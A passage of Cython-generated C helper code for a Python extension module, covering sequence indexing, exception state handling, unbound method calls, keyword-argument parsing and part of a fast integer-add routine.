PyTuple_GET_SIZE(o);\n    }\n    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyTuple_GET_SIZE(o)))) {\n        PyObject *r = PyTuple_GET_ITEM(o, wrapped_i);\n        Py_INCREF(r);\n        return r;\n    }\n    return __Pyx_GetItemInt_Generic(o, PyLong_FromSsize_t(i));\n#else\n    return PySequence_GetItem(o, i);\n#endif\n}\nstatic CYTHON_INLINE PyObject *__Pyx_GetItemInt_Fast(PyObject *o, Py_ssize_t i, int is_list,\n                                                     CYTHON_NCP_UNUSED int wraparound,\n                                                     CYTHON_NCP_UNUSED int boundscheck) {\n#if CYTHON_ASSUME_SAFE_MACROS && CYTHON_ASSUME_SAFE_SIZE && !CYTHON_AVOID_BORROWED_REFS && CYTHON_USE_TYPE_SLOTS\n    if (is_list || PyList_CheckExact(o)) {\n        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyList_GET_SIZE(o);\n        if ((!boundscheck) || (likely(__Pyx_is_valid_index(n, PyList_GET_SIZE(o))))) {\n            return __Pyx_PyList_GetItemRef(o, n);\n        }\n    }\n    else if (PyTuple_CheckExact(o)) {\n        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyTuple_GET_SIZE(o);\n        if ((!boundscheck) || likely(__Pyx_is_valid_index(n, PyTuple_GET_SIZE(o)))) {\n            PyObject *r = PyTuple_GET_ITEM(o, n);\n            Py_INCREF(r);\n            return r;\n        }\n    } else {\n        PyMappingMethods *mm = Py_TYPE(o)->tp_as_mapping;\n        PySequenceMethods *sm = Py_TYPE(o)->tp_as_sequence;\n        if (mm && mm->mp_subscript) {\n            PyObject *r, *key = PyLong_FromSsize_t(i);\n            if (unlikely(!key)) return NULL;\n            r = mm->mp_subscript(o, key);\n            Py_DECREF(key);\n            return r;\n        }\n        if (likely(sm && sm->sq_item)) {\n            if (wraparound && unlikely(i < 0) && likely(sm->sq_length)) {\n                Py_ssize_t l = sm->sq_length(o);\n                if (likely(l >= 0)) {\n                    i += l;\n                } else {\n                    if (!PyErr_ExceptionMatches(PyExc_OverflowError))\n                        return NULL;\n                    PyErr_Clear();\n                }\n            }\n            return sm->sq_item(o, i);\n        }\n    }\n#else\n    if (is_list || !PyMapping_Check(o)) {\n        return PySequence_GetItem(o, i);\n    }\n#endif\n    return __Pyx_GetItemInt_Generic(o, PyLong_FromSsize_t(i));\n}\n\n\n#if !CYTHON_COMPILING_IN_PYPY\nstatic PyObject *__Pyx_PyDict_GetItem(PyObject *d, PyObject* key) {\n    PyObject *value;\n    if (unlikely(__Pyx_PyDict_GetItemRef(d, key, &value) == 0)) { // no value, no error\n        if (unlikely(PyTuple_Check(key))) {\n            PyObject* args = PyTuple_Pack(1, key);\n            if (likely(args)) {\n                PyErr_SetObject(PyExc_KeyError, args);\n                Py_DECREF(args);\n            }\n        } else {\n            PyErr_SetObject(PyExc_KeyError, key);\n        }\n    }\n    return value;\n}\n#endif\n\n\n#if CYTHON_USE_PYTYPE_LOOKUP && CYTHON_USE_TYPE_SLOTS\nstatic CYTHON_INLINE PyObject* __Pyx__PyObject_LookupSpecial(PyObject* obj, PyObject* attr_name, int with_error) {\n    PyObject *res;\n    PyTypeObject *tp = Py_TYPE(obj);\n    res = _PyType_Lookup(tp, attr_name);\n    if (likely(res)) {\n        descrgetfunc f = Py_TYPE(res)->tp_descr_get;\n        if (!f) {\n            Py_INCREF(res);\n        } else {\n            res = f(res, obj, (PyObject *)tp);\n        }\n    } else if (with_error) {\n        PyErr_SetObject(PyExc_AttributeError, attr_name);\n    }\n    return res;\n}\n#endif\n\n\n#if CYTHON_USE_EXC_INFO_STACK && CYTHON_FAST_THREAD_STATE\nstatic _PyErr_StackItem *\n__Pyx_PyErr_GetTopmostException(PyThreadState *tstate)\n{\n    _PyErr_StackItem *exc_info = tstate->exc_info;\n    while ((exc_info->exc_value == NULL || exc_info->exc_value == Py_None) &&\n           exc_info->previous_item != NULL)\n    {\n        exc_info = exc_info->previous_item;\n    }\n    return exc_info;\n}\n#endif\n\n\n#if CYTHON_FAST_THREAD_STATE\nstatic CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {\n  #if CYTHON_USE_EXC_INFO_STACK && PY_VERSION_HEX >= 0x030B00a4\n    _PyErr_StackItem *exc_info = __Pyx_PyErr_GetTopmostException(tstate);\n    PyObject *exc_value = exc_info->exc_value;\n    if (exc_value == NULL || exc_value == Py_None) {\n        *value = NULL;\n        *type = NULL;\n        *tb = NULL;\n    } else {\n        *value = exc_value;\n        Py_INCREF(*value);\n        *type = (PyObject*) Py_TYPE(exc_value);\n        Py_INCREF(*type);\n        *tb = PyException_GetTraceback(exc_value);\n    }\n  #elif CYTHON_USE_EXC_INFO_STACK\n    _PyErr_StackItem *exc_info = __Pyx_PyErr_GetTopmostException(tstate);\n    *type = exc_info->exc_type;\n    *value = exc_info->exc_value;\n    *tb = exc_info->exc_traceback;\n    Py_XINCREF(*type);\n    Py_XINCREF(*value);\n    Py_XINCREF(*tb);\n  #else\n    *type = tstate->exc_type;\n    *value = tstate->exc_value;\n    *tb = tstate->exc_traceback;\n    Py_XINCREF(*type);\n    Py_XINCREF(*value);\n    Py_XINCREF(*tb);\n  #endif\n}\nstatic CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {\n  #if CYTHON_USE_EXC_INFO_STACK && PY_VERSION_HEX >= 0x030B00a4\n    _PyErr_StackItem *exc_info = tstate->exc_info;\n    PyObject *tmp_value = exc_info->exc_value;\n    exc_info->exc_value = value;\n    Py_XDECREF(tmp_value);\n    Py_XDECREF(type);\n    Py_XDECREF(tb);\n  #else\n    PyObject *tmp_type, *tmp_value, *tmp_tb;\n    #if CYTHON_USE_EXC_INFO_STACK\n    _PyErr_StackItem *exc_info = tstate->exc_info;\n    tmp_type = exc_info->exc_type;\n    tmp_value = exc_info->exc_value;\n    tmp_tb = exc_info->exc_traceback;\n    exc_info->exc_type = type;\n    exc_info->exc_value = value;\n    exc_info->exc_traceback = tb;\n    #else\n    tmp_type = tstate->exc_type;\n    tmp_value = tstate->exc_value;\n    tmp_tb = tstate->exc_traceback;\n    tstate->exc_type = type;\n    tstate->exc_value = value;\n    tstate->exc_traceback = tb;\n    #endif\n    Py_XDECREF(tmp_type);\n    Py_XDECREF(tmp_value);\n    Py_XDECREF(tmp_tb);\n  #endif\n}\n#endif\n\n\n#if CYTHON_FAST_THREAD_STATE\nstatic CYTHON_INLINE void __Pyx__ExceptionSwap(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {\n    PyObject *tmp_type, *tmp_value, *tmp_tb;\n  #if CYTHON_USE_EXC_INFO_STACK && PY_VERSION_HEX >= 0x030B00a4\n    _PyErr_StackItem *exc_info = tstate->exc_info;\n    tmp_value = exc_info->exc_value;\n    exc_info->exc_value = *value;\n    if (tmp_value == NULL || tmp_value == Py_None) {\n        Py_XDECREF(tmp_value);\n        tmp_value = NULL;\n        tmp_type = NULL;\n        tmp_tb = NULL;\n    } else {\n        tmp_type = (PyObject*) Py_TYPE(tmp_value);\n        Py_INCREF(tmp_type);\n        #if CYTHON_COMPILING_IN_CPYTHON\n        tmp_tb = ((PyBaseExceptionObject*) tmp_value)->traceback;\n        Py_XINCREF(tmp_tb);\n        #else\n        tmp_tb = PyException_GetTraceback(tmp_value);\n        #endif\n    }\n  #elif CYTHON_USE_EXC_INFO_STACK\n    _PyErr_StackItem *exc_info = tstate->exc_info;\n    tmp_type = exc_info->exc_type;\n    tmp_value = exc_info->exc_value;\n    tmp_tb = exc_info->exc_traceback;\n    exc_info->exc_type = *type;\n    exc_info->exc_value = *value;\n    exc_info->exc_traceback = *tb;\n  #else\n    tmp_type = tstate->exc_type;\n    tmp_value = tstate->exc_value;\n    tmp_tb = tstate->exc_traceback;\n    tstate->exc_type = *type;\n    tstate->exc_value = *value;\n    tstate->exc_traceback = *tb;\n  #endif\n    *type = tmp_type;\n    *value = tmp_value;\n    *tb = tmp_tb;\n}\n#else\nstatic CYTHON_INLINE void __Pyx_ExceptionSwap(PyObject **type, PyObject **value, PyObject **tb) {\n    PyObject *tmp_type, *tmp_value, *tmp_tb;\n    PyErr_GetExcInfo(&tmp_type, &tmp_value, &tmp_tb);\n    PyErr_SetExcInfo(*type, *value, *tb);\n    *type = tmp_type;\n    *value = tmp_value;\n    *tb = tmp_tb;\n}\n#endif\n\n\nstatic void __Pyx_RaiseDoubleKeywordsError(\n    const char* func_name,\n    PyObject* kw_name)\n{\n    PyErr_Format(PyExc_TypeError,\n        "%s() got multiple values for keyword argument \'%U\'", func_name, kw_name);\n}\n\n\n#if CYTHON_COMPILING_IN_LIMITED_API && __PYX_LIMITED_VERSION_HEX < 0x030C0000\nstatic PyObject *__Pyx_SelflessCall(PyObject *method, PyObject *args, PyObject *kwargs) {\n    PyObject *result;\n    PyObject *selfless_args = PyTuple_GetSlice(args, 1, PyTuple_Size(args));\n    if (unlikely(!selfless_args)) return NULL;\n    result = PyObject_Call(method, selfless_args, kwargs);\n    Py_DECREF(selfless_args);\n    return result;\n}\n#elif CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX < 0x03090000\nstatic PyObject *__Pyx_SelflessCall(PyObject *method, PyObject **args, Py_ssize_t nargs, PyObject *kwnames) {\n        return _PyObject_Vectorcall\n            (method, args ? args+1 : NULL, nargs ? nargs-1 : 0, kwnames);\n}\n#else\nstatic PyObject *__Pyx_SelflessCall(PyObject *method, PyObject *const *args, Py_ssize_t nargs, PyObject *kwnames) {\n    return\n#if PY_VERSION_HEX < 0x03090000\n    _PyObject_Vectorcall\n#else\n    PyObject_Vectorcall\n#endif\n        (method, args ? args+1 : NULL, nargs ? (size_t) nargs-1 : 0, kwnames);\n}\n#endif\nstatic PyMethodDef __Pyx_UnboundCMethod_Def = {\n     "CythonUnboundCMethod",\n     __PYX_REINTERPRET_FUNCION(PyCFunction, __Pyx_SelflessCall),\n#if CYTHON_COMPILING_IN_LIMITED_API && __PYX_LIMITED_VERSION_HEX < 0x030C0000\n     METH_VARARGS | METH_KEYWORDS,\n#else\n     METH_FASTCALL | METH_KEYWORDS,\n#endif\n     NULL\n};\nstatic int __Pyx_TryUnpackUnboundCMethod(__Pyx_CachedCFunction* target) {\n    PyObject *method, *result=NULL;\n    method = __Pyx_PyObject_GetAttrStr(target->type, *target->method_name);\n    if (unlikely(!method))\n        return -1;\n    result = method;\n#if CYTHON_COMPILING_IN_CPYTHON\n    if (likely(__Pyx_TypeCheck(method, &PyMethodDescr_Type)))\n    {\n        PyMethodDescrObject *descr = (PyMethodDescrObject*) method;\n        target->func = descr->d_method->ml_meth;\n        target->flag = descr->d_method->ml_flags & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_STACKLESS);\n    } else\n#endif\n#if CYTHON_COMPILING_IN_PYPY\n#else\n    if (PyCFunction_Check(method))\n#endif\n    {\n        PyObject *self;\n        int self_found;\n#if CYTHON_COMPILING_IN_LIMITED_API || CYTHON_COMPILING_IN_PYPY\n        self = PyObject_GetAttrString(method, "__self__");\n        if (!self) {\n            PyErr_Clear();\n        }\n#else\n        self = PyCFunction_GET_SELF(method);\n#endif\n        self_found = (self && self != Py_None);\n#if CYTHON_COMPILING_IN_LIMITED_API || CYTHON_COMPILING_IN_PYPY\n        Py_XDECREF(self);\n#endif\n        if (self_found) {\n            PyObject *unbound_method = PyCFunction_New(&__Pyx_UnboundCMethod_Def, method);\n            if (unlikely(!unbound_method)) return -1;\n            Py_DECREF(method);\n            result = unbound_method;\n        }\n    }\n#if !CYTHON_COMPILING_IN_CPYTHON_FREETHREADING\n    if (unlikely(target->method)) {\n        Py_DECREF(result);\n    } else\n#endif\n    target->method = result;\n    return 0;\n}\n\n\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic CYTHON_INLINE PyObject *__Pyx_CallUnboundCMethod2(__Pyx_CachedCFunction *cfunc, PyObject *self, PyObject *arg1, PyObject *arg2) {\n    int was_initialized = __Pyx_CachedCFunction_GetAndSetInitializing(cfunc);\n    if (likely(was_initialized == 2 && cfunc->func)) {\n        PyObject *args[2] = {arg1, arg2};\n        if (cfunc->flag == METH_FASTCALL) {\n            return __Pyx_CallCFunctionFast(cfunc, self, args, 2);\n        }\n        if (cfunc->flag == (METH_FASTCALL | METH_KEYWORDS))\n            return __Pyx_CallCFunctionFastWithKeywords(cfunc, self, args, 2, NULL);\n    }\n#if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING\n    else if (unlikely(was_initialized == 1)) {\n        __Pyx_CachedCFunction tmp_cfunc = {\n#ifndef __cplusplus\n            0\n#endif\n        };\n        tmp_cfunc.type = cfunc->type;\n        tmp_cfunc.method_name = cfunc->method_name;\n        return __Pyx__CallUnboundCMethod2(&tmp_cfunc, self, arg1, arg2);\n    }\n#endif\n    PyObject *result = __Pyx__CallUnboundCMethod2(cfunc, self, arg1, arg2);\n    __Pyx_CachedCFunction_SetFinishedInitializing(cfunc);\n    return result;\n}\n#endif\nstatic PyObject* __Pyx__CallUnboundCMethod2(__Pyx_CachedCFunction* cfunc, PyObject* self, PyObject* arg1, PyObject* arg2){\n    if (unlikely(!cfunc->func && !cfunc->method) && unlikely(__Pyx_TryUnpackUnboundCMethod(cfunc) < 0)) return NULL;\n#if CYTHON_COMPILING_IN_CPYTHON\n    if (cfunc->func && (cfunc->flag & METH_VARARGS)) {\n        PyObject *result = NULL;\n        PyObject *args = PyTuple_New(2);\n        if (unlikely(!args)) return NULL;\n        Py_INCREF(arg1);\n        PyTuple_SET_ITEM(args, 0, arg1);\n        Py_INCREF(arg2);\n        PyTuple_SET_ITEM(args, 1, arg2);\n        if (cfunc->flag & METH_KEYWORDS)\n            result = __Pyx_CallCFunctionWithKeywords(cfunc, self, args, NULL);\n        else\n            result = __Pyx_CallCFunction(cfunc, self, args);\n        Py_DECREF(args);\n        return result;\n    }\n#endif\n    {\n        PyObject *args[4] = {NULL, self, arg1, arg2};\n        return __Pyx_PyObject_FastCall(cfunc->method, args+1, 3 | __Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET);\n    }\n}\n\n\nstatic int __Pyx_ValidateDuplicatePosArgs(\n    PyObject *kwds,\n    PyObject ** const argnames[],\n    PyObject ** const *first_kw_arg,\n    const char* function_name)\n{\n    PyObject ** const *name = argnames;\n    while (name != first_kw_arg) {\n        PyObject *key = **name;\n        int found = PyDict_Contains(kwds, key);\n        if (unlikely(found)) {\n            if (found == 1) __Pyx_RaiseDoubleKeywordsError(function_name, key);\n            goto bad;\n        }\n        name++;\n    }\n    return 0;\nbad:\n    return -1;\n}\n#if CYTHON_USE_UNICODE_INTERNALS\nstatic CYTHON_INLINE int __Pyx_UnicodeKeywordsEqual(PyObject *s1, PyObject *s2) {\n    int kind;\n    Py_ssize_t len = PyUnicode_GET_LENGTH(s1);\n    if (len != PyUnicode_GET_LENGTH(s2)) return 0;\n    kind = PyUnicode_KIND(s1);\n    if (kind != PyUnicode_KIND(s2)) return 0;\n    const void *data1 = PyUnicode_DATA(s1);\n    const void *data2 = PyUnicode_DATA(s2);\n    return (memcmp(data1, data2, (size_t) len * (size_t) kind) == 0);\n}\n#endif\nstatic int __Pyx_MatchKeywordArg_str(\n    PyObject *key,\n    PyObject ** const argnames[],\n    PyObject ** const *first_kw_arg,\n    size_t *index_found,\n    const char *function_name)\n{\n    PyObject ** const *name;\n    #if CYTHON_USE_UNICODE_INTERNALS\n    Py_hash_t key_hash = ((PyASCIIObject*)key)->hash;\n    if (unlikely(key_hash == -1)) {\n        key_hash = PyObject_Hash(key);\n        if (unlikely(key_hash == -1))\n            goto bad;\n    }\n    #endif\n    name = first_kw_arg;\n    while (*name) {\n        PyObject *name_str = **name;\n        #if CYTHON_USE_UNICODE_INTERNALS\n        if (key_hash == ((PyASCIIObject*)name_str)->hash && __Pyx_UnicodeKeywordsEqual(name_str, key)) {\n            *index_found = (size_t) (name - argnames);\n            return 1;\n        }\n        #else\n        #if CYTHON_ASSUME_SAFE_SIZE\n        if (PyUnicode_GET_LENGTH(name_str) == PyUnicode_GET_LENGTH(key))\n        #endif\n        {\n            int cmp = PyUnicode_Compare(name_str, key);\n            if (cmp < 0 && unlikely(PyErr_Occurred())) goto bad;\n            if (cmp == 0) {\n                *index_found = (size_t) (name - argnames);\n                return 1;\n            }\n        }\n        #endif\n        name++;\n    }\n    name = argnames;\n    while (name != first_kw_arg) {\n        PyObject *name_str = **name;\n        #if CYTHON_USE_UNICODE_INTERNALS\n        if (unlikely(key_hash == ((PyASCIIObject*)name_str)->hash)) {\n            if (__Pyx_UnicodeKeywordsEqual(name_str, key))\n                goto arg_passed_twice;\n        }\n        #else\n        #if CYTHON_ASSUME_SAFE_SIZE\n        if (PyUnicode_GET_LENGTH(name_str) == PyUnicode_GET_LENGTH(key))\n        #endif\n        {\n            if (unlikely(name_str == key)) goto arg_passed_twice;\n            int cmp = PyUnicode_Compare(name_str, key);\n            if (cmp < 0 && unlikely(PyErr_Occurred())) goto bad;\n            if (cmp == 0) goto arg_passed_twice;\n        }\n        #endif\n        name++;\n    }\n    return 0;\narg_passed_twice:\n    __Pyx_RaiseDoubleKeywordsError(function_name, key);\n    goto bad;\nbad:\n    return -1;\n}\nstatic int __Pyx_MatchKeywordArg_nostr(\n    PyObject *key,\n    PyObject ** const argnames[],\n    PyObject ** const *first_kw_arg,\n    size_t *index_found,\n    const char *function_name)\n{\n    PyObject ** const *name;\n    if (unlikely(!PyUnicode_Check(key))) goto invalid_keyword_type;\n    name = first_kw_arg;\n    while (*name) {\n        int cmp = PyObject_RichCompareBool(**name, key, Py_EQ);\n        if (cmp == 1) {\n            *index_found = (size_t) (name - argnames);\n            return 1;\n        }\n        if (unlikely(cmp == -1)) goto bad;\n        name++;\n    }\n    name = argnames;\n    while (name != first_kw_arg) {\n        int cmp = PyObject_RichCompareBool(**name, key, Py_EQ);\n        if (unlikely(cmp != 0)) {\n            if (cmp == 1) goto arg_passed_twice;\n            else goto bad;\n        }\n        name++;\n    }\n    return 0;\narg_passed_twice:\n    __Pyx_RaiseDoubleKeywordsError(function_name, key);\n    goto bad;\ninvalid_keyword_type:\n    PyErr_Format(PyExc_TypeError,\n        "%.200s() keywords must be strings", function_name);\n    goto bad;\nbad:\n    return -1;\n}\nstatic CYTHON_INLINE int __Pyx_MatchKeywordArg(\n    PyObject *key,\n    PyObject ** const argnames[],\n    PyObject ** const *first_kw_arg,\n    size_t *index_found,\n    const char *function_name)\n{\n    return likely(PyUnicode_CheckExact(key)) ?\n        __Pyx_MatchKeywordArg_str(key, argnames, first_kw_arg, index_found, function_name) :\n        __Pyx_MatchKeywordArg_nostr(key, argnames, first_kw_arg, index_found, function_name);\n}\nstatic void __Pyx_RejectUnknownKeyword(\n    PyObject *kwds,\n    PyObject ** const argnames[],\n    PyObject ** const *first_kw_arg,\n    const char *function_name)\n{\n    Py_ssize_t pos = 0;\n    PyObject *key = NULL;\n    __Pyx_BEGIN_CRITICAL_SECTION(kwds);\n    while (PyDict_Next(kwds, &pos, &key, NULL)) {\n        PyObject** const *name = first_kw_arg;\n        while (*name && (**name != key)) name++;\n        if (!*name) {\n            #if CYTHON_AVOID_BORROWED_REFS\n            Py_INCREF(key);\n            #endif\n            size_t index_found = 0;\n            int cmp = __Pyx_MatchKeywordArg(key, argnames, first_kw_arg, &index_found, function_name);\n            if (cmp != 1) {\n                if (cmp == 0) {\n                    PyErr_Format(PyExc_TypeError,\n                        "%s() got an unexpected keyword argument \'%U\'",\n                        function_name, key);\n                }\n                #if CYTHON_AVOID_BORROWED_REFS\n                Py_DECREF(key);\n                #endif\n                break;\n            }\n            #if CYTHON_AVOID_BORROWED_REFS\n            Py_DECREF(key);\n            #endif\n        }\n    }\n    __Pyx_END_CRITICAL_SECTION();\n    assert(PyErr_Occurred());\n}\nstatic int __Pyx_ParseKeywordDict(\n    PyObject *kwds,\n    PyObject ** const argnames[],\n    PyObject *values[],\n    Py_ssize_t num_pos_args,\n    Py_ssize_t num_kwargs,\n    const char* function_name,\n    int ignore_unknown_kwargs)\n{\n    PyObject** const *name;\n    PyObject** const *first_kw_arg = argnames + num_pos_args;\n    Py_ssize_t extracted = 0;\n#if !CYTHON_COMPILING_IN_PYPY || defined(PyArg_ValidateKeywordArguments)\n    if (unlikely(!PyArg_ValidateKeywordArguments(kwds))) return -1;\n#endif\n    name = first_kw_arg;\n    while (*name && num_kwargs > extracted) {\n        PyObject * key = **name;\n        PyObject *value;\n        int found = 0;\n        #if __PYX_LIMITED_VERSION_HEX >= 0x030d0000\n        found = PyDict_GetItemRef(kwds, key, &value);\n        #else\n        value = PyDict_GetItemWithError(kwds, key);\n        if (value) {\n            Py_INCREF(value);\n            found = 1;\n        } else {\n            if (unlikely(PyErr_Occurred())) goto bad;\n        }\n        #endif\n        if (found) {\n            if (unlikely(found < 0)) goto bad;\n            values[name-argnames] = value;\n            extracted++;\n        }\n        name++;\n    }\n    if (num_kwargs > extracted) {\n        if (ignore_unknown_kwargs) {\n            if (unlikely(__Pyx_ValidateDuplicatePosArgs(kwds, argnames, first_kw_arg, function_name) == -1))\n                goto bad;\n        } else {\n            __Pyx_RejectUnknownKeyword(kwds, argnames, first_kw_arg, function_name);\n            goto bad;\n        }\n    }\n    return 0;\nbad:\n    return -1;\n}\nstatic int __Pyx_ParseKeywordDictToDict(\n    PyObject *kwds,\n    PyObject ** const argnames[],\n    PyObject *kwds2,\n    PyObject *values[],\n    Py_ssize_t num_pos_args,\n    const char* function_name)\n{\n    PyObject** const *name;\n    PyObject** const *first_kw_arg = argnames + num_pos_args;\n    Py_ssize_t len;\n#if !CYTHON_COMPILING_IN_PYPY || defined(PyArg_ValidateKeywordArguments)\n    if (unlikely(!PyArg_ValidateKeywordArguments(kwds))) return -1;\n#endif\n    if (PyDict_Update(kwds2, kwds) < 0) goto bad;\n    name = first_kw_arg;\n    while (*name) {\n        PyObject *key = **name;\n        PyObject *value;\n#if !CYTHON_COMPILING_IN_LIMITED_API && (PY_VERSION_HEX >= 0x030d00A2 || defined(PyDict_Pop))\n        int found = PyDict_Pop(kwds2, key, &value);\n        if (found) {\n            if (unlikely(found < 0)) goto bad;\n            values[name-argnames] = value;\n        }\n#elif __PYX_LIMITED_VERSION_HEX >= 0x030d0000\n        int found = PyDict_GetItemRef(kwds2, key, &value);\n        if (found) {\n            if (unlikely(found < 0)) goto bad;\n            values[name-argnames] = value;\n            if (unlikely(PyDict_DelItem(kwds2, key) < 0)) goto bad;\n        }\n#else\n    #if CYTHON_COMPILING_IN_CPYTHON\n        value = _PyDict_Pop(kwds2, key, kwds2);\n    #else\n        value = __Pyx_CallUnboundCMethod2(&__pyx_mstate_global->__pyx_umethod_PyDict_Type_pop, kwds2, key, kwds2);\n    #endif\n        if (value == kwds2) {\n            Py_DECREF(value);\n        } else {\n            if (unlikely(!value)) goto bad;\n            values[name-argnames] = value;\n        }\n#endif\n        name++;\n    }\n    len = PyDict_Size(kwds2);\n    if (len > 0) {\n        return __Pyx_ValidateDuplicatePosArgs(kwds, argnames, first_kw_arg, function_name);\n    } else if (unlikely(len == -1)) {\n        goto bad;\n    }\n    return 0;\nbad:\n    return -1;\n}\nstatic int __Pyx_ParseKeywordsTuple(\n    PyObject *kwds,\n    PyObject * const *kwvalues,\n    PyObject ** const argnames[],\n    PyObject *kwds2,\n    PyObject *values[],\n    Py_ssize_t num_pos_args,\n    Py_ssize_t num_kwargs,\n    const char* function_name,\n    int ignore_unknown_kwargs)\n{\n    PyObject *key = NULL;\n    PyObject** const * name;\n    PyObject** const *first_kw_arg = argnames + num_pos_args;\n    for (Py_ssize_t pos = 0; pos < num_kwargs; pos++) {\n#if CYTHON_AVOID_BORROWED_REFS\n        key = __Pyx_PySequence_ITEM(kwds, pos);\n#else\n        key = __Pyx_PyTuple_GET_ITEM(kwds, pos);\n#endif\n#if !CYTHON_ASSUME_SAFE_MACROS\n        if (unlikely(!key)) goto bad;\n#endif\n        name = first_kw_arg;\n        while (*name && (**name != key)) name++;\n        if (*name) {\n            PyObject *value = kwvalues[pos];\n            values[name-argnames] = __Pyx_NewRef(value);\n        } else {\n            size_t index_found = 0;\n            int cmp = __Pyx_MatchKeywordArg(key, argnames, first_kw_arg, &index_found, function_name);\n            if (cmp == 1) {\n                PyObject *value = kwvalues[pos];\n                values[index_found] = __Pyx_NewRef(value);\n            } else {\n                if (unlikely(cmp == -1)) goto bad;\n                if (kwds2) {\n                    PyObject *value = kwvalues[pos];\n                    if (unlikely(PyDict_SetItem(kwds2, key, value))) goto bad;\n                } else if (!ignore_unknown_kwargs) {\n                    goto invalid_keyword;\n                }\n            }\n        }\n        #if CYTHON_AVOID_BORROWED_REFS\n        Py_DECREF(key);\n        key = NULL;\n        #endif\n    }\n    return 0;\ninvalid_keyword:\n    PyErr_Format(PyExc_TypeError,\n        "%s() got an unexpected keyword argument \'%U\'",\n        function_name, key);\n    goto bad;\nbad:\n    #if CYTHON_AVOID_BORROWED_REFS\n    Py_XDECREF(key);\n    #endif\n    return -1;\n}\nstatic int __Pyx_ParseKeywords(\n    PyObject *kwds,\n    PyObject * const *kwvalues,\n    PyObject ** const argnames[],\n    PyObject *kwds2,\n    PyObject *values[],\n    Py_ssize_t num_pos_args,\n    Py_ssize_t num_kwargs,\n    const char* function_name,\n    int ignore_unknown_kwargs)\n{\n    if (CYTHON_METH_FASTCALL && likely(PyTuple_Check(kwds)))\n        return __Pyx_ParseKeywordsTuple(kwds, kwvalues, argnames, kwds2, values, num_pos_args, num_kwargs, function_name, ignore_unknown_kwargs);\n    else if (kwds2)\n        return __Pyx_ParseKeywordDictToDict(kwds, argnames, kwds2, values, num_pos_args, function_name);\n    else\n        return __Pyx_ParseKeywordDict(kwds, argnames, values, num_pos_args, num_kwargs, function_name, ignore_unknown_kwargs);\n}\n\n\nstatic void __Pyx_RaiseArgtupleInvalid(\n    const char* func_name,\n    int exact,\n    Py_ssize_t num_min,\n    Py_ssize_t num_max,\n    Py_ssize_t num_found)\n{\n    Py_ssize_t num_expected;\n    const char *more_or_less;\n    if (num_found < num_min) {\n        num_expected = num_min;\n        more_or_less = "at least";\n    } else {\n        num_expected = num_max;\n        more_or_less = "at most";\n    }\n    if (exact) {\n        more_or_less = "exactly";\n    }\n    PyErr_Format(PyExc_TypeError,\n                 "%.200s() takes %.8s %" CYTHON_FORMAT_SSIZE_T "d positional argument%.1s (%" CYTHON_FORMAT_SSIZE_T "d given)",\n                 func_name, more_or_less, num_expected,\n                 (num_expected == 1) ? "" : "s", num_found);\n}\n\n\n#if !CYTHON_COMPILING_IN_PYPY\nstatic PyObject* __Pyx_Fallback___Pyx_PyLong_AddObjC(PyObject *op1, PyObject *op2, int inplace) {\n    return (inplace ? PyNumber_InPlaceAdd : PyNumber_Add)(op1, op2);\n}\n#if CYTHON_USE_PYLONG_INTERNALS\nstatic PyObject* __Pyx_Unpacked___Pyx_PyLong_AddObjC(PyObject *op1, PyObject *op2, long intval, int inplace, int zerodivision_check) {\n    CYTHON_MAYBE_UNUSED_VAR(inplace);\n    CYTHON_UNUSED_VAR(zerodivision_check);\n    const long b = intval;\n    long a, x;\n#ifdef HAVE_LONG_LONG\n    const PY_LONG_LONG llb = intval;\n    PY_LONG_LONG lla, llx;\n#endif\n    if (unlikely(__Pyx_PyLong_IsZero(op1))) {\n        return __Pyx_NewRef(op2);\n    }\n    if (unlikely(!__Pyx_PyLong_CompactAsLong(op1, &a))) {\n        const digit* digits = __Pyx_PyLong_Digits(op1);\n        const Py_ssize_t size = __Pyx_PyLong_SignedDigitCount(op1);\n        switch (size) {\n            case -2:\n                if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {\n                    a = -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));\n                    break;\n                #ifdef HAVE_LONG_LONG\n                } else if (8 * sizeof(PY_LONG_LONG) - 1 > 2 * PyLong_SHIFT) {\n                    lla = -(PY_LONG_LONG) (((((unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));\n                    goto long_long;\n                #endif\n                }\n                CYTHON_FALLTHROUGH;\n            case 2:\n                if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {\n                    a = (long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));\n                    break;\n                #ifdef HAVE_LONG_LONG\n                } else if (8 * sizeof(PY_LONG_LONG) - 1 > 2 * PyLong_SHIFT) {\n                    lla = (PY_LONG_LONG) (((((unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));\n                    goto long_long;\n                #endif\n                }\n                CYTHON_FALLTHROUGH;\n            case -3:\n                if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {\n                    a = -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));\n                    break;\n                #ifdef HAVE_LONG_LONG\n                } else if (8 * sizeof(PY_LONG_LONG) - 1 > 3 * PyLong_SHIFT) {\n                    lla = -(PY_LONG_LONG) (((((((unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));\n                    goto long_long;\n                #endif\n                }\n                CYTHON_FALLTHROUGH;\n            case 3:\n                if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {\n                    a = (long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned 